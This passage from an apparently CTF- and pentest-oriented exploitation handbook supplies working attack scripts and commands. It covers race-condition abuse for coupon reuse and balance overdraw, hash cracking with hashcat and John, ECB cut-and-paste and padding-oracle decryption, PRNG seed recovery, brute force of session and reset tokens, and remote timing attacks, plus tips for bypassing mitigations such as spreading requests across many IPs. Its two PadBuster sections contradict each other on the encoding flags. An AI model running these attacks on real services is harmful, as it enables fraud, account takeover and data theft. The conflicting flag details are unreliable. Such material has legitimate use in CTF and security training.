        engine.queue(target.req, gate='warm')
    engine.openGate('warm')
    
    # Wait for completion
    time.sleep(2)
    
    # Race condition attack
    for i in range(50):
        engine.queue(target.req, gate='race')
    engine.openGate('race')
```

### Last-Byte Synchronization

Technique to achieve microsecond-level synchronization by withholding final byte.

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=1,
                          requestsPerConnection=20,
                          pipeline=False)
    
    # Modify request to make it incomplete
    req = target.req.replace('\r\n\r\n', '\r\nContent-Length: 0\r\n\r')
    
    # Queue incomplete requests
    for i in range(20):
        engine.queue(req, gate='sync')
    
    # Complete all requests simultaneously
    engine.openGate('sync')
```

[Inference]: Last-byte sync effectiveness depends on server buffering behavior, which varies by implementation.

### Response Analysis

```python
def handleResponse(req, interesting):
    # Check for success indicators
    if '200 OK' in req.response:
        if 'balance' in req.response:
            table.add(req)
    
    # Detect race condition success
    if req.response and 'insufficient funds' not in req.response:
        table.add(req)
```

### Payload Injection

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=1,
                          requestsPerConnection=100)
    
    # Inject usernames for enumeration
    for username in open('usernames.txt'):
        req = target.req.replace('USER', username.strip())
        engine.queue(req, gate='enum')
    
    engine.openGate('enum')
```

## Common Exploitation Patterns

### Limit Bypass

**Scenario**: 1 free trial per user

```python
# Queue multiple registration requests
for i in range(10):
    engine.queue(target.req, gate='bypass')
engine.openGate('bypass')
```

**Expected outcome**: Multiple accounts created before database constraint enforced.

### Discount Code Reuse

**Scenario**: Single-use coupon code

Attack vector: Apply same code in parallel before usage flag updates.

```python
# Modify coupon parameter
for i in range(50):
    req = target.req.replace('COUPON', 'SUMMER2024')
    engine.queue(req, gate='coupon')
engine.openGate('coupon')
```

### Balance/Inventory Manipulation

**Scenario**: Withdraw/purchase exceeding available resources

```
Initial: balance = $100
Request 1: withdraw $100
Request 2: withdraw $100
Both check balance before deduction → both succeed
Result: -$100 balance
```

## Detection and Monitoring

### Server-Side Indicators

- Negative balances/inventory
- Duplicate unique constraints violations in logs
- Transaction isolation errors
- Deadlock occurrences

### Manual Testing Approach

1. Identify state-changing endpoints
2. Analyze for TOCTOU gaps (check vs use)
3. Test with 2 simultaneous requests
4. Scale to 20+ requests if vulnerable
5. Analyze response consistency

### Timing Analysis

```bash
# Measure response time distribution
for i in {1..100}; do
  time curl -X POST https://target.com/api/check > /dev/null 2>&1
done | grep real | awk '{print $2}' | sort
```

Look for bimodal distributions indicating different code paths.

## Alternative Tools

**race-the-web**: Dedicated race condition testing

```bash
git clone https://github.com/aaronhnatiw/race-the-web
cd race-the-web
./race-the-web -u https://target.com/transfer -c 50
```

**custom Python script** with threading:

```python
import threading
import requests

def exploit():
    requests.post('https://target.com/api/withdraw', 
                  json={'amount': 1000})

threads = []
for i in range(20):
    t = threading.Thread(target=exploit)
    threads.append(t)
    t.start()

[thread.join() for thread in threads]
```

[Inference]: Threading effectiveness depends on Python GIL behavior; multiprocessing may provide better parallelism.

## Defense Understanding (for exploitation)

### Common Mitigations to Bypass

**Pessimistic locking**: Database-level locks

- Test for incomplete implementation (missing endpoints)
- Check for timeout configurations

**Optimistic locking**: Version numbers/timestamps

- Race to update before version increments

**Request deduplication**: Hash-based filtering

- Modify non-validated parameters slightly

**Rate limiting**: Request throttling

- Distributed attacks from multiple IPs
- Timing-based bypass windows

---

**Related exploitation areas**: Authentication flaws, business logic vulnerabilities, API security, time-based attacks

---

# Cryptographic Failures

## Weak Hashing Algorithms

### Overview

Weak hashing algorithms lack collision resistance, have known vulnerabilities, or use insufficient output lengths. In CTF contexts, these are exploited through precomputed tables, brute force attacks, or collision generation.

### Common Weak Hash Functions

**MD5 (Message Digest 5)**

- 128-bit output
- Collision attacks proven practical since 2004
- Still found in legacy systems, password storage, file integrity checks

**SHA-1 (Secure Hash Algorithm 1)**

- 160-bit output
- Collision attack demonstrated (SHAttered, 2017)
- Deprecated but still in use for Git commits, certificates

**CRC32 (Cyclic Redundancy Check)**

- 32-bit output
- Not cryptographically secure
- Designed for error detection, not authentication

**DES-based hashes**

- Including traditional Unix crypt()
- Limited keyspace (56-bit effective)

### Identification Techniques

**Hash length analysis:**

```bash
# MD5: 32 hex characters (128 bits)
echo -n "5d41402abc4b2a76b9719d911017c592" | wc -c
# Output: 32

# SHA-1: 40 hex characters (160 bits)
echo -n "aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d" | wc -c
# Output: 40

# SHA-256: 64 hex characters (256 bits)
echo -n "2c26b46b68ffc68ff99b453c1d30413413422d706483bfa0f98a5e886266e7ae" | wc -c
# Output: 64
```

**Using hashid:**

```bash
hashid 5d41402abc4b2a76b9719d911017c592
# Analyzing '5d41402abc4b2a76b9719d911017c592'
# [+] MD2
# [+] MD5
# [+] MD4
```

**Using hash-identifier:**

```bash
hash-identifier
# Paste hash when prompted
```

### Exploitation Methods

**Rainbow Tables**

Pre-computed hash tables for rapid password recovery:

```bash
# Using RainbowCrack
rtgen md5 loweralpha 1 7 0 3800 33554432 0
rtsort .
rcrack . -h 5d41402abc4b2a76b9719d911017c592
```

**Online databases:**

- CrackStation: https://crackstation.net/
- cmd5.org
- HashKiller
- Hashes.com

[Inference] These databases likely contain billions of precomputed hashes from common wordlists and patterns.

**Brute Force with Hashcat**

```bash
# MD5 cracking with wordlist
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

# MD5 with rules
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# SHA-1 cracking
hashcat -m 100 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

# Mask attack on MD5 (8 lowercase letters)
hashcat -m 0 -a 3 hash.txt ?l?l?l?l?l?l?l?l

# Common hash modes:
# 0    = MD5
# 100  = SHA1
# 1400 = SHA256
# 3200 = bcrypt
# 1800 = sha512crypt
```

**Performance considerations:**

```bash
# Benchmark specific hash type
hashcat -b -m 0

# Force CPU mode
hashcat -m 0 -a 0 hashes.txt wordlist.txt -D 1

# Use specific GPU
hashcat -m 0 -a 0 hashes.txt wordlist.txt -d 1
```

**John the Ripper**

```bash
# Auto-detect format and crack
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Specify format
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Apply mangling rules
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt --rules hashes.txt

# Show cracked passwords
john --show hashes.txt

# Incremental mode (brute force)
john --incremental=Alpha --format=raw-md5 hashes.txt
```

**Hash collision generation (MD5)**

```bash
# Using HashClash for MD5 collisions
git clone https://github.com/cr-marcstevens/hashclash.git
cd hashclash
# Follow build instructions

# Using fastcoll (faster MD5 collision tool)
./fastcoll -p prefix_file.bin -o collision1.bin collision2.bin
```

[Unverified] The practical impact of collision attacks varies significantly based on application context - while file collisions are demonstrated, exploiting them requires specific conditions.

### Common CTF Scenarios

**Scenario 1: Password hash disclosure**

Found hash in source code or database dump:

```bash
# Save hash to file
echo "5f4dcc3b5aa765d61d8327deb882cf99" > hash.txt

# Quick online check
curl -s "https://md5decrypt.net/Api/api.asp?hash=5f4dcc3b5aa765d61d8327deb882cf99&hash_type=md5&email=deanna_abshire@gmail.com&code=1122334455"

# Offline cracking
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt --force
```

**Scenario 2: Authentication bypass via hash collision**

If application checks `MD5(input) == known_hash`:

```python
# Example vulnerable code
import hashlib
if hashlib.md5(user_input.encode()).hexdigest() == stored_hash:
    grant_access()
```

Create collision pair with known plaintext.

**Scenario 3: File integrity bypass**

When MD5/SHA-1 used for file integrity:

```bash
# Generate two files with same MD5
./md5_collision_generator original.pdf

# Verify collision
md5sum collision1.pdf collision2.pdf
```

### Mitigation Recognition

Identify when moving to secure implementations:

**Secure alternatives observed:**

- bcrypt (Blowfish-based, with work factor)
- scrypt (memory-hard function)
- Argon2 (modern, recommended)
- PBKDF2 with sufficient iterations (>100,000)
- SHA-256/SHA-512 with proper salting (minimum requirement)

**Detection in code:**

```python
# Weak
import hashlib
password_hash = hashlib.md5(password.encode()).hexdigest()

# Better (but still suboptimal)
import hashlib
password_hash = hashlib.sha256(password.encode() + salt).hexdigest()

# Strong
import bcrypt
password_hash = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))
```

---

## Predictable Encryption

### Overview

Predictable encryption arises from weak key generation, deterministic algorithms without proper randomization, ECB mode usage, or insufficient key lengths.

### ECB Mode Vulnerabilities

**Electronic Codebook (ECB) Mode**

Encrypts identical plaintext blocks to identical ciphertext blocks - reveals patterns.

**Detection:**

```bash
# Visual pattern detection in encrypted images
python3 -c "
from PIL import Image
import sys

img = Image.open(sys.argv[1])
img.show()
" encrypted_image.bmp
```

If encrypted image shows visible patterns of original, likely ECB mode.

**Exploitation - Known plaintext attack:**

```python
#!/usr/bin/env python3
from Crypto.Cipher import AES
import base64

# If you can control plaintext and observe ciphertext
def detect_ecb(ciphertext, block_size=16):
    blocks = [ciphertext[i:i+block_size] for i in range(0, len(ciphertext), block_size)]
    return len(blocks) != len(set(blocks))

# Example: Oracle that encrypts your input + secret
def encryption_oracle(plaintext):
    # Attacker-controlled function
    return get_ciphertext_from_server(plaintext)

# Craft repeated blocks
payload = b'A' * 64
ciphertext = encryption_oracle(payload)

if detect_ecb(ciphertext):
    print("[+] ECB mode detected - vulnerable to block manipulation")
```

**Byte-at-a-time ECB decryption:**

```python
#!/usr/bin/env python3
# When oracle encrypts: your_input + secret_suffix

def byte_at_a_time_ecb_decrypt(oracle_func, block_size=16):
    secret = b''
    
    while True:
        # Craft input one byte short of block boundary
        prefix_len = (block_size - 1 - len(secret) % block_size) % block_size
        prefix = b'A' * prefix_len
        
        # Get target block
        target_ciphertext = oracle_func(prefix)
        target_block_idx = (prefix_len + len(secret)) // block_size
        target_block = target_ciphertext[target_block_idx*block_size:(target_block_idx+1)*block_size]
        
        # Brute force next byte
        found = False
        for byte_val in range(256):
            test_input = prefix + secret + bytes([byte_val])
            test_ciphertext = oracle_func(test_input)
            test_block = test_ciphertext[target_block_idx*block_size:(target_block_idx+1)*block_size]
            
            if test_block == target_block:
                secret += bytes([byte_val])
                found = True
                break
        
        if not found:
            break
            
    return secret
```

**ECB Cut-and-Paste Attack:**

```python
#!/usr/bin/env python3
# When you can control encrypted content structure

# Goal: Escalate from user=attacker to user=admin

# Step 1: Create block with "admin" + padding
# email=AAAAAAAAAA admin\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b &uid=10&role=user
payload1 = "AAAAAAAAAA" + "admin\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b"
encrypted1 = encrypt(payload1)
admin_block = encrypted1[16:32]  # Extract second block

# Step 2: Create profile ending at block boundary before role
# email=attacker@bar.com&uid=10&role=
payload2 = "attacker@bar.com"  # Crafted to align role at block start
encrypted2 = encrypt(payload2)

# Step 3: Replace last block with admin block
forged = encrypted2[:-16] + admin_block
```

### Weak Key Derivation

**Static/Hardcoded Keys:**

```bash
# Search for hardcoded keys in source
grep -r "AES.new\|DES.new\|Cipher.new" . --include="*.py"
grep -r "key\s*=\s*['\"]" . --include="*.py"
grep -r "SECRET_KEY\|API_KEY\|ENCRYPTION_KEY" . --include="*.js" --include="*.php"

# Check JavaScript files
strings app.js | grep -i "key\|secret\|encrypt"

# Examine Android APK
jadx-gui app.apk  # Look for hardcoded keys in code
```

**Weak key generation:**

```python
#!/usr/bin/env python3
# Vulnerable: Using predictable seed
import random
random.seed(1234)  # Static seed
key = bytes([random.randint(0, 255) for _ in range(16)])

# Vulnerable: Time-based seed
import time
random.seed(int(time.time()))  # Predictable within timeframe
```

**Exploitation of time-based seeds:**

```python
#!/usr/bin/env python3
from Crypto.Cipher import AES
import random
import time

def try_decrypt(ciphertext, timestamp):
    random.seed(timestamp)
    key = bytes([random.randint(0, 255) for _ in range(16)])
    try:
        cipher = AES.new(key, AES.MODE_ECB)
        plaintext = cipher.decrypt(ciphertext)
        return plaintext
    except:
        return None

# If you know approximate encryption time
ciphertext = bytes.fromhex("...")
base_timestamp = 1634567890  # Approximate time

for offset in range(-3600, 3600):  # +/- 1 hour
    timestamp = base_timestamp + offset
    result = try_decrypt(ciphertext, timestamp)
    if result and b"flag" in result:
        print(f"[+] Found at timestamp: {timestamp}")
        print(f"[+] Plaintext: {result}")
        break
```

### Small Keyspace Attacks

**DES (56-bit effective key):**

```bash
# Using John the Ripper for DES-encrypted data
john --format=des encrypted_file.txt

# Hashcat for DES
hashcat -m 14000 -a 3 des_hash.txt ?a?a?a?a?a?a?a?a
```

**Weak RSA implementations:**

```python
#!/usr/bin/env python3
from Crypto.PublicKey import RSA
from Crypto.Util.number import *
import gmpy2

# Attack 1: Small public exponent with small message
def attack_small_e(c, e, n):
    # If m^e < n, just take eth root
    m = gmpy2.iroot(c, e)[0]
    return long_to_bytes(int(m))

# Attack 2: Common modulus attack
def common_modulus_attack(c1, c2, e1, e2, n):
    # When same message encrypted with different e values, same n
    def egcd(a, b):
        if a == 0:
            return (b, 0, 1)
        else:
            g, y, x = egcd(b % a, a)
            return (g, x - (b // a) * y, y)
    
    g, a, b = egcd(e1, e2)
    if g != 1:
        return None
    
    result = (pow(c1, a, n) * pow(c2, b, n)) % n
    return long_to_bytes(result)

# Attack 3: Factoring small n
def factor_n(n):
    # Using factordb API
    import requests
    r = requests.get(f"http://factordb.com/api?query={n}")
    # Parse response for factors
    pass
```

**Common RSA attacks with RsaCtfTool:**

```bash
# Install
git clone https://github.com/RsaCtfTool/RsaCtfTool.git
cd RsaCtfTool
pip3 install -r requirements.txt

# Basic usage
python3 RsaCtfTool.py --publickey public.pem --uncipherfile encrypted.txt

# With private key in specific format
python3 RsaCtfTool.py --publickey public.key --private --uncipher ciphertext.txt

# Multiple attacks automatically
python3 RsaCtfTool.py --publickey public.pem --uncipherfile flag.enc --attack all

# Specify attack methods
python3 RsaCtfTool.py --publickey public.pem --uncipherfile encrypted.txt --attack wiener,factordb,pastctfprimes
```

### Padding Oracle Attacks

When CBC mode decryption errors are observable:

```bash
# Using padbuster
padbuster http://target.com/decrypt.php "encrypted_data" 16 -cookies "auth=encrypted_data"

# Options:
# -encoding 0   : HEX encoding
# -encoding 1   : Base64 encoding (default)
# -encoding 2   : Lowercase hex

# Example with encoded parameter
padbuster http://target.com/login.php "7B216A634951170FF851D6CC68FC9537" 8 -encoding 0 -cookies "session=7B216A634951170FF851D6CC68FC9537"

# Encrypt new plaintext using oracle
padbuster http://target.com/decrypt.php "old_ciphertext" 16 -plaintext "admin=true" -cookies "auth=old_ciphertext"
```

**Manual padding oracle exploitation:**

```python
#!/usr/bin/env python3
import requests
from Crypto.Util.strxor import strxor

def oracle(ciphertext):
    """Returns True if padding is valid"""
    r = requests.post("http://target.com/decrypt", data={"ct": ciphertext.hex()})
    return "Padding error" not in r.text

def decrypt_block(prev_block, curr_block):
    """Decrypt single block using padding oracle"""
    plaintext = b''
    
    for pad_val in range(1, 17):
        for byte_val in range(256):
            # Craft malicious previous block
            crafted_prev = bytearray(16)
            
            # Set known bytes for correct padding
            for i in range(1, pad_val):
                crafted_prev[16-i] = prev_block[16-i] ^ plaintext[i-1] ^ pad_val
            
            # Try current byte
            crafted_prev[16-pad_val] = byte_val
            
            if oracle(bytes(crafted_prev) + curr_block):
                plaintext = bytes([byte_val ^ prev_block[16-pad_val] ^ pad_val]) + plaintext
                break
    
    return plaintext
```

### Stream Cipher Key Reuse

**XOR key reuse (Many-Time Pad):**

```python
#!/usr/bin/env python3
from Crypto.Util.strxor import strxor

# If key is reused: c1 = m1 ⊕ key, c2 = m2 ⊕ key
# Then: c1 ⊕ c2 = m1 ⊕ m2

def break_reused_key(ciphertexts):
    """Given multiple ciphertexts encrypted with same key"""
    # XOR pairs to eliminate key
    xored_pairs = []
    for i in range(len(ciphertexts)):
        for j in range(i+1, len(ciphertexts)):
            xored_pairs.append(strxor(ciphertexts[i], ciphertexts[j]))
    
    # Look for patterns (space XOR letter = flipped case)
    # Automate with frequency analysis
    return analyze_xor_patterns(xored_pairs)

# Using cribdrag for known plaintext
def crib_drag(ciphertext, known_plaintext):
    """Drag known plaintext across ciphertext"""
    results = []
    for i in range(len(ciphertext) - len(known_plaintext)):
        key_fragment = strxor(ciphertext[i:i+len(known_plaintext)], known_plaintext)
        results.append((i, key_fragment))
    return results
```

**Using xortool:**

```bash
# Analyze XOR-ed data
xortool encrypted_file

# Specify key length
xortool -l 16 encrypted_file

# Specify most frequent character (space in English)
xortool -c 20 encrypted_file

# Output to directory
xortool -o output_dir/ encrypted_file
```

### IV/Nonce Reuse

**AES-GCM nonce reuse:**

[Unverified] Reusing a nonce in GCM mode can allow key recovery, though the specific method depends on implementation details and requires polynomial operations over GF(2^128).

**AES-CTR IV reuse:**

```python
#!/usr/bin/env python3
# CTR mode with reused IV/counter: c = m ⊕ keystream
# If IV reused: c1 ⊕ c2 = m1 ⊕ m2 (same as stream cipher reuse)

from Crypto.Cipher import AES

def exploit_ctr_iv_reuse(c1, c2, known_plaintext, position):
    """
    c1, c2: ciphertexts encrypted with same IV
    known_plaintext: known portion of message 1
    position: where known plaintext appears in message 1
    """
    # Extract keystream from known plaintext
    keystream = strxor(c1[position:position+len(known_plaintext)], known_plaintext)
    
    # Apply keystream to decrypt same position in c2
    decrypted = strxor(c2[position:position+len(known_plaintext)], keystream)
    return decrypted
```

---

## Weak Random Number Generation

### Overview

Insufficient entropy in random number generation enables prediction of session tokens, cryptographic keys, and security-sensitive values.

### Identifying Weak RNGs

**Common weak implementations:**

```python
# Python - predictable random module
import random
random.seed(12345)  # Mersenne Twister - deterministic
token = random.randint(1000, 9999)

# PHP - mt_rand() 
<?php
mt_srand(time());  # Predictable seed
$token = mt_rand();
?>

# JavaScript - Math.random()
var token = Math.random().toString(36).substring(2);  # Not cryptographically secure
```

**Secure alternatives:**

```python
# Python - cryptographically secure
import secrets
token = secrets.token_hex(16)

# PHP - cryptographically secure
<?php
$token = bin2hex(random_bytes(16));
?>

# JavaScript (Node.js)
const crypto = require('crypto');
const token = crypto.randomBytes(16).toString('hex');
```

### Exploiting Mersenne Twister

**State recovery from outputs:**

```bash
# Using randcrack (Python)
git clone https://github.com/tna0y/Python-random-module-cracker.git
cd Python-random-module-cracker
pip3 install randcrack
```

```python
#!/usr/bin/env python3
from randcrack import RandCrack

# Need 624 * 32 bits = 624 outputs of random.getrandbits(32)
rc = RandCrack()

# Feed known outputs
for i in range(624):
    rc.submit(known_outputs[i])  # 32-bit values

# Predict future outputs
predicted = rc.predict_getrandbits(32)
predicted_token = rc.predict_randint(1000, 9999)
```

**PHP mt_rand() prediction:**

```bash
# Using php_mt_seed
git clone https://github.com/openwall/php_mt_seed.git
cd php_mt_seed
make

# Run with known outputs
./php_mt_seed <first_output> <second_output> <third_output>
```

```php
<?php
// Once seed recovered
mt_srand($recovered_seed);

// Replay sequence
for ($i = 0; $i < $skip_count; $i++) {
    mt_rand();  // Advance to current state
}

// Predict next value
$next_token = mt_rand();
?>
```

### Time-based Seed Exploitation

**Timestamp prediction:**

```python
#!/usr/bin/env python3
import random
import time

def bruteforce_time_seed(target_output, start_time, window=3600):
    """
    target_output: Known value from random.random() or randint()
    start_time: Approximate timestamp when random was seeded
    window: Time window to search (seconds)
    """
    for offset in range(-window, window):
        timestamp = start_time + offset
        random.seed(timestamp)
        
        # Test if this seed produces target output
        if random.randint(0, 999999) == target_output:
            print(f"[+] Found seed: {timestamp}")
            return timestamp
    
    return None

# More efficient with multiple known outputs
def verify_seed(seed, known_outputs):
    random.seed(seed)
    for expected in known_outputs:
        if random.randint(0, 999999) != expected:
            return False
    return True
```

**Example CTF scenario:**

```python
#!/usr/bin/env python3
# Token generated at known time (from HTTP Date header or log)
# Server code: random.seed(int(time.time())); token = random.randint(100000, 999999)

import requests
import random
import time
from datetime import datetime

# Parse server timestamp from response header
response = requests.get("http://target.com/generate_token")
server_time_str = response.headers['Date']
server_timestamp = int(datetime.strptime(server_time_str, "%a, %d %b %Y %H:%M:%S GMT").timestamp())

# Bruteforce around that time
for delta in range(-10, 10):
    test_time = server_timestamp + delta
    random.seed(test_time)
    predicted_token = random.randint(100000, 999999)
    
    # Try predicted token
    test_response = requests.post("http://target.com/verify", data={"token": predicted_token})
    if "success" in test_response.text.lower():
        print(f"[+] Valid token: {predicted_token} (seed: {test_time})")
        break
```

### Insufficient Entropy in Tokens

**Low entropy session tokens:**

```python
#!/usr/bin/env python3
import itertools
import requests

# Example: 4-digit numeric tokens
for token in range(1000, 10000):
    response = requests.get(f"http://target.com/admin", cookies={"session": str(token)})
    if response.status_code == 200:
        print(f"[+] Valid session: {token}")
        break

# Example: Short hex tokens (3 bytes = 16^6 combinations)
for token_int in range(0, 16**6):
    token = f"{token_int:06x}"
    response = requests.get(f"http://target.com/reset?token={token}")
    if "Reset password" in response.text:
        print(f"[+] Valid reset token: {token}")
        break
```

**Timing-based bruteforce optimization:**

```python
#!/usr/bin/env python3
import requests
import time
import concurrent.futures

def test_token(token):
    try:
        r = requests.get(f"http://target.com/verify/{token}", timeout=5)
        return (token, r.status_code)
    except:
        return (token, None)

# Parallel bruteforce
with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
    tokens = range(100000, 999999)
    results = executor.map(test_token, tokens)
    
    for token, status in results:
        if status == 200:
            print(f"[+] Found valid token: {token}")
            executor.shutdown(wait=False)
            break
```

### UUID Predictability

**UUIDv1 (timestamp + MAC address):**

```python
#!/usr/bin/env python3
import uuid
import time

# UUIDv1 contains timestamp and MAC address
generated = uuid.uuid1()
print(f"UUID: {generated}")
print(f"Timestamp: {generated.time}")
print(f"MAC: {hex(generated.node)}")

# Predict sequential UUIDs
def predict_next_uuid1(last_uuid, increment=1):
    """Generate next sequential UUIDv1"""
    new_time = last_uuid.time + (increment * 10)  # 100-nanosecond intervals
    new_uuid = uuid.UUID(fields=(
        new_time & 0xffffffff,
        (new_time >> 32) & 0xffff,
        (new_time >> 48) & 0x0fff | 0x1000,
        last_uuid.clock_seq_hi_variant,
        last_uuid.clock_seq_low,
        last_uuid.node
    ))
    return new_uuid
```

**Sequential resource enumeration:**

```bash
# If resources use sequential UUIDs
for i in {1..1000}; do
    curl -s "http://target.com/api/documents/$(uuidgen | cut -d'-' -f1)00000-0000-1000-8000-00805f9b34fb" | grep -i "flag"
done
```

### PRNG State Analysis Tools

**Untwister (Mersenne Twister seed recovery):**

```bash
git clone https://github.com/altf4/untwister.git
cd untwister
make

# Generate input file with observed outputs
./untwister -i observed_values.txt -d depth
```

**Maple (PHP mt_rand seed finder):**

```bash
git clone https://github.com/d0nutptr/maple.git
cd maple
cargo build --release

./target/release/maple <first_rand> <second_rand>
```

### Defense Recognition

Indicators of properly implemented randomness:

```python
# Secure token generation
import secrets
secure_token = secrets.token_urlsafe(32)  # 32 bytes = 256 bits entropy

# Secure password reset tokens
import os
reset_token = os.urandom(32).hex()  # From OS entropy source

# Secure session IDs
import uuid
session_id = uuid.uuid4()  # UUIDv4 uses random bits
```

**Entropy testing:**

```bash
# Test randomness with ent
cat random_data.bin | ent

# Look for:
# - Entropy close to 8.0 bits per byte
# - Chi-square distribution
# - Low compression ratio

# Using rngtest
cat /dev/random | rngtest -c 1000
```

---

## Cryptographic Side-Channel Attacks

### Timing Attacks

Timing attacks exploit measurable variations in cryptographic operation execution time to extract secret information. Operations that branch based on secret values create distinguishable timing patterns.

**Vulnerable Operations:**

- String comparison with early termination
- Modular exponentiation without constant-time implementation
- AES table lookups susceptible to cache timing
- HMAC verification with short-circuit logic
- Password/token comparison using `==` instead of constant-time comparison

**Manual Timing Measurement:**

```bash
# Basic timing analysis with curl
for i in {1..1000}; do
  curl -w "%{time_total}\n" -o /dev/null -s \
  "https://target.com/verify?token=test_value_$i" >> times.txt
done

# Statistical analysis
awk '{sum+=$1; sumsq+=$1*$1} END {
  print "Average:", sum/NR; 
  print "StdDev:", sqrt(sumsq/NR - (sum/NR)^2)
}' times.txt

# Compare two different inputs
while read -r token; do
  time=$(curl -w "%{time_total}" -o /dev/null -s \
    "https://target.com/verify?token=$token")
  echo "$token,$time"
done < wordlist.txt | sort -t, -k2 -n
```

**Python Timing Attack Framework:**

```python
#!/usr/bin/env python3
import requests
import time
import statistics
import string

URL = "https://target.com/api/verify"
SAMPLES = 200
CHARSET = string.ascii_letters + string.digits + string.punctuation

def measure_timing(payload, param="token"):
    """Measure median response time for payload"""
    times = []
    for _ in range(SAMPLES):
        start = time.perf_counter_ns()
        try:
            r = requests.post(URL, data={param: payload}, timeout=5)
        except requests.RequestException:
            continue
        elapsed = time.perf_counter_ns() - start
        times.append(elapsed)
    
    # Remove outliers (top/bottom 10%)
    times.sort()
    trimmed = times[len(times)//10 : -len(times)//10]
    return statistics.median(trimmed)

def timing_attack_sequential(known_prefix=""):
    """Extract secret byte-by-byte using timing oracle"""
    while True:
        candidates = {}
        baseline = measure_timing(known_prefix)
        
        for char in CHARSET:
            test_payload = known_prefix + char
            timing = measure_timing(test_payload)
            delta = timing - baseline
            candidates[char] = delta
            print(f"[*] {test_payload}: {delta/1e6:.2f}ms delta")
        
        # Character with highest timing delta likely correct
        best_char = max(candidates, key=candidates.get)
        max_delta = candidates[best_char]
        
        # Statistical significance check
        second_best = sorted(candidates.values())[-2]
        if max_delta - second_best < baseline * 0.05:  # <5% difference
            print(f"[-] Insufficient timing difference, stopping")
            break
            
        known_prefix += best_char
        print(f"[+] Found: {known_prefix}\n")
        
    return known_prefix

if __name__ == "__main__":
    result = timing_attack_sequential()
    print(f"\n[+] Final result: {result}")
```

**Automated Tools:**

```bash
# timed-decode for automatic timing attacks
pip3 install timed-decode

timed-decode --url "https://target.com/verify" \
  --parameter "token" \
  --charset "0123456789abcdef" \
  --length 32 \
  --samples 300 \
  --confidence 95

# With custom headers
timed-decode --url "https://target.com/api/auth" \
  --parameter "password" \
  --method POST \
  --header "X-API-Key: value" \
  --charset "printable" \
  --samples 500

# TimingAttack tool
git clone https://github.com/ffleming/timing_attack
cd timing_attack
python3 timing_attack.py --url https://target.com/login \
  --param password \
  --samples 100 \
  --threads 5
```

**Remote Timing Attack Considerations:**

Network jitter mitigation:

- Increase sample size (200-500 samples minimum)
- Use median instead of mean
- Remove statistical outliers
- Perform attacks from geographically close servers
- Test during low-traffic periods
- Use persistent HTTP connections (`Connection: keep-alive`)

**Cache Timing Attacks on AES:**

[Inference] Cache timing attacks on AES implementations exploit CPU cache behavior during table lookups. The attack requires local code execution or shared hosting environment.

```bash
# Flush+Reload attack proof-of-concept
# Requires: local execution, shared memory pages

gcc -o cache_attack cache_attack.c -O2

# Monitor cache access patterns
./cache_attack --target-process nginx --aes-tables

# Tools for cache analysis
git clone https://github.com/clementine-m/cache_template_attacks
cd cache_template_attacks
make
./spy --victim-pid 1234
```

### Padding Oracle Attacks

Padding oracle attacks exploit CBC mode encryption when the server reveals whether ciphertext decrypts to validly padded plaintext. This allows full plaintext recovery and ciphertext forgery.

**CBC Padding Mechanism:**

PKCS#7 padding adds N bytes of value N to reach block size:

```
Plaintext: "hello" (5 bytes, 16-byte blocks)
Padded: "hello\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b"
```

**Vulnerability Indicators:**

- Different error messages for "Invalid padding" vs "Decryption failed"
- Different HTTP status codes (500 vs 400)
- Timing differences in error responses
- Exception stack traces mentioning padding

**PadBuster - Primary Tool:**

```bash
# Installation
git clone https://github.com/AonCyberLabs/PadBuster
cd PadBuster
chmod +x padBuster.pl

# Basic decryption attack
./padBuster.pl http://target.com/decrypt \
  "u7bvLewln6PJPSAbMb5qJw==" \
  8 \
  -cookies "auth=u7bvLewln6PJPSAbMb5qJw==" \
  -encoding 0

# Parameters:
# Arg1: URL with encrypted parameter
# Arg2: Sample ciphertext (base64)
# Arg3: Block size (8 for 3DES, 16 for AES)
# -encoding: 0=base64, 1=hex lowercase, 2=hex uppercase

# With error pattern detection
./padBuster.pl http://target.com/view?data=CIPHERTEXT \
  "CIPHERTEXT" \
  16 \
  -encoding 0 \
  -error "Invalid padding" \
  -log

# POST request with padding oracle
./padBuster.pl http://target.com/decrypt \
  "ciphertext_value" \
  16 \
  -post "data=CIPHERTEXT" \
  -encoding 0 \
  -error "Padding incorrect"

# Encryption mode - forge valid ciphertext
./padBuster.pl http://target.com/decrypt \
  "known_valid_ciphertext" \
  16 \
  -cookies "session=known_valid_ciphertext" \
  -plaintext "user=admin&role=superuser" \
  -encoding 0

# Advanced options
./padBuster.pl http://target.com/api/data \
  "cipher" \
  16 \
  -cookies "auth=cipher" \
  -encoding 0 \
  -noiv \                    # Skip IV in ciphertext
  -resume 5 \                # Resume from block 5
  -verbose \
  -log
```

**Manual Padding Oracle Implementation:**

```python
#!/usr/bin/env python3
from base64 import b64encode, b64decode
import requests
import sys

TARGET_URL = "http://target.com/decrypt"
BLOCK_SIZE = 16

def padding_oracle(ciphertext):
    """
    Returns True if padding is valid
    Adjust detection logic based on application behavior
    """
    try:
        r = requests.get(
            TARGET_URL,
            cookies={'data': b64encode(ciphertext).decode()},
            timeout=5
        )
        # Detection methods:
        # 1. Error message
        if 'padding' in r.text.lower() or 'invalid' in r.text.lower():
            return False
        # 2. Status code
        if r.status_code == 500:
            return False
        # 3. Response length
        if len(r.text) < 100:  # Short error response
            return False
        return True
    except requests.RequestException:
        return False

def decrypt_block(ciphertext_block, iv_block):
    """Decrypt a single ciphertext block using padding oracle"""
    intermediate = bytearray(BLOCK_SIZE)
    plaintext = bytearray(BLOCK_SIZE)
    
    for pad_value in range(1, BLOCK_SIZE + 1):
